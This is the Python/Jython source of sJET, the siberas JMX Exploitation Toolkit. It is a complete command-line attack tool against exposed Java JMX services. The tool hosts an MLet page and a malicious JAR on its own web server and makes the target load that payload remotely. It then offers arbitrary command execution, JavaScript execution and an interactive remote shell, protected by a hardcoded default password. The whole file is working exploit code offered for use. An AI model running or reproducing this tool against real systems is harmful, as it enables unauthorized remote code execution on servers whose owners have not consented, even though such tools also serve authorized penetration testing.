# jmx stuff
from javax.management.remote import JMXServiceURL
from javax.management.remote import JMXConnector
from javax.management.remote import JMXConnectorFactory
from javax.management import ObjectName
from java.lang import String
from java.lang import Object

# BaseHTTPServer needed to serve mlets
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from threading import Thread

import sys
import time
import jarray

# Extra
import argparse
import base64

authorSignature =  'sJET - siberas JMX Exploitation Toolkit\n'
authorSignature += '======================================='


### AUX ###
def connectToJMX(args):
    # Basic JMX connection, always required
    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")
    print "[+] Connecting to: " + str(jmx_url)
    jmx_connector = JMXConnectorFactory.connect(jmx_url)
    print "[+] Connected: " + str(jmx_connector.getConnectionId())
    bean_server = jmx_connector.getMBeanServerConnection()
    return bean_server
##########

### INSTALL MODE ###

def installMode(args):
    startWebserver(args)
    bean_server = connectToJMX(args)
    installMBeans(args, bean_server)

def installMBeans(args, bean_server):
    # Installation, load javax.management.loading.MLet to install additional MBeans
    # If loading fails, the Mlet is already loaded...
    try:
        mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
    except:
        # MLet Bean can't be created because it already exists
        mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))

    print "[+] Loaded " + str(mlet_bean.getClassName())


    # Install payload Mlet via getMbeansFromURL
    # pass the URL of the web server
    print "[+] Loading malicious MBean from " + args.payload_url
    print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"


    inv_array1 = jarray.zeros(1, Object)
    inv_array1[0] = args.payload_url

    inv_array2 = jarray.zeros(1, String)
    inv_array2[0] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)

    # Check if the Mlet was loaded successfully

    for res in resource:
        if res.__class__.__name__ == "InstanceAlreadyExistsException":
            print "[+] Object instance already existed, no need to install it a second time"
        elif res.__class__.__name__ == "ObjectInstance":
            print "[+] Successfully loaded MBean" + str(res.getObjectName())

            # Change the password from "I+n33d+a+glass+0f+watta" to the new value
            print "[+] Changing default password..."
            changePassword("I+n33d+a+glass+0f+watta", args.password, bean_server)



def startWebserver(args):
    # Start a web server on all ports in a seperate thread
    # Only needed during installation
    print "[+] Starting webserver at port " + str(args.payload_port)
    mletHandler = MakeHandlerClass(args.payload_url)
    mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
    webserver_thread = Thread(target = mlet_webserver.serve_forever)
    webserver_thread.daemon = True
    try:
        webserver_thread.start()
    except KeyboardInterrupt:
        mlet_webserver.shutdown()
        sys.exit(0)

def MakeHandlerClass(base_url):
    #This class will handles any incoming request from
    #the JMX service
    # Needed during installation of the JAR
    class CustomHandler(BaseHTTPRequestHandler):

        def __init__(self, *args, **kwargs):
             self._base_url = base_url
             BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

        #Handler for the GET requests
        def do_GET(self):
            if self.path=="/":
                mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="siberas_mlet.jar" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'

                self.send_response(200)
                self.send_header('Pragma', 'no-cache')
                self.end_headers()
                self.wfile.write(mlet_code)

            elif self.path=="/siberas_mlet.jar":
                f = open("./payloads/siberas_mlet.jar")
                self.send_response(200)
                self.send_header('Content-type', 'application/jar')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()

            else:
                self.send_error(404, 'File not found: ' + self.path)
                #
                # except IOError:
                #   self.send_error(404,'File Not Found: %s' % self.path)

    return CustomHandler

### /INSTALL MODE ###


### COMMAND MODE ###

def changePasswordMode(args):
    bean_server = connectToJMX(args)
    changePassword(args.password, args.newpass, bean_server)
    print "[+] Done"

def changePassword(password, newpass, bean_server):
    # Payload execution
    # Load the Payload Met and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = newpass

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)

    if str(resource) == "True":
        print "[+] Sucessfully changed password"
    else:
        print "[-] Unable to change password"


    sys.stdout.write("\n")
    sys.stdout.flush()

### /COMMAND MODE ###


### COMMAND MODE ###

def commandMode(args):
    bean_server = connectToJMX(args)
    executeCommand(args.password, args.cmd, bean_server)
    print "[+] Done"

def executeCommand(password, cmd, bean_server):
    # Payload execution
    # Load the Payload Met and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing command: " + cmd
    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = cmd


    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)

    print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /COMMAND MODE ###

### JAVASCRIPT MODE ###

def scriptMode(args):
    bean_server = connectToJMX(args)

    with open(args.filename, 'r') as myfile:
        script=myfile.read()

    executeJS(args.password, script, bean_server)


def executeJS(password, js, bean_server):
    # Payload execution
    # Load the Payload Met and invoke a method on it
    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
    print "[+] Loaded " + str(mlet_bean.getClassName())

    print "[+] Executing script"
    inv_array1 = jarray.zeros(2, Object)
    inv_array1[0] = password
    inv_array1[1] = js

    inv_array2 = jarray.zeros(2, String)
    inv_array2[0] = String.canonicalName
    inv_array2[1] = String.canonicalName

    resource = bean_server.invoke(mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)

    if resource is not None:
        print resource

    sys.stdout.write("\n")
    sys.stdout.flush()

### /JAVASCRIPT MODE ###


### SHELL MODE ###

def shellMode(args):
    bean_server = connectToJMX(args)
    startShell(args.password, bean_server)
    print "[+] Done"

def startShell(password, bean_server):
    print "[+] Use command 'exit_shell' to exit the shell"
    in_command_loop = True
    while in_command_loop:
        cmd = raw_input(">>> ")
        if cmd == 'exit_shell':
            in_command_loop = False
        else:
            executeCommand(password, cmd, bean_server)

### /SHELL MODE ###



### PARSER ###
# Map for clarity's sake
def arg_install_mode(args):
    print authorSignature
    installMode(args)
def arg_command_mode(args):
    print authorSignature
    commandMode(args)
def arg_script_mode(args):
    print authorSignature
    scriptMode(args)
def arg_shell_mode(args):
    print authorSignature
    shellMode(args)
def arg_password_mode(args):
    print authorSignature
    changePasswordMode(args)


# Base parser
parser = argparse.ArgumentParser(description = 'description', epilog='By siberas', add_help=True)
parser.add_argument('targetHost', help='target IP address')
parser.add_argument('targetPort', help='target JMX service port')
parser.add_argument('password', help="the password to execute the payload")
subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')

# Install mode
install_subparser = subparsers.add_parser('install', help='install the payload on the target')
install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
install_subparser.add_argument('payload_port', help='port to load the payload')
install_subparser.set_defaults(func=arg_install_mode)

# Password mode
install_subparser = subparsers.add_parser('password', help='change the payload password on the target')
install_subparser.add_argument('newpass', help='The new password')
install_subparser.set_defaults(func=arg_password_mode)

# Command mode
command_subparser = subparsers.add_parser('command', help='execute a command in the target')
command_subparser.add_argument('cmd', help='command to be executed')
command_subparser.set_defaults(func=arg_command_mode)

# Javascript mode
script_subparser = subparsers.add_parser('javascript', help='execute a javascript from a file in the target')
script_subparser.add_argument('filename', help='file with the javascript to be executed')
script_subparser.set_defaults(func=arg_script_mode)

# Shell mode
shell_subparser = subparsers.add_parser('shell', help='open a simple shell in the target')
shell_subparser.set_defaults(func=arg_shell_mode)

# Store the user args
args = parser.parse_args()
args.func(args)
